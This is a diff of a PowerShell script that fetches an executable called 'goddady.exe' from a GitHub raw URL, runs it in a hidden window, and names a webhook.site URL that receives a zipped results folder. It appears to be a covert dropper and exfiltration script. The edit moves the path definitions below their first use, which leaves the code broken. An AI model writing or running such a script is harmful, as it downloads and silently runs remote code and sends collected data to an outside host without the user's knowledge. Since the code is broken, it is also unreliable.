@@ -1,13 +1,14 @@
 $exeName = 'goddady.exe'; # Name of the executable
 $zipUrl = 'https://webhook.site/2911c139-ed87-4411-a940-58458f44ebb1'; # Replace with the URL to receive the zip file
-$exePath = Join-Path $PSScriptRoot $exeName;
-$resultsFolder = Join-Path $PSScriptRoot 'results';
-$zipPath = Join-Path $PSScriptRoot 'results.zip';
 
 try {
     if (-not (Test-Path $exePath -PathType Leaf)) {
         iwr -Uri 'https://github.com/AndreiVladescu/Powershell-Scripts/raw/refs/heads/main/goddady.exe' -OutFile $exePath; # Download only if not present
     }
+
+	$exePath = Join-Path $PSScriptRoot $exeName;
+	$resultsFolder = Join-Path $PSScriptRoot 'results';
+	$zipPath = Join-Path $PSScriptRoot 'results.zip';
 
     Start-Process -FilePath $exePath -WindowStyle Hidden; # Run in background
 
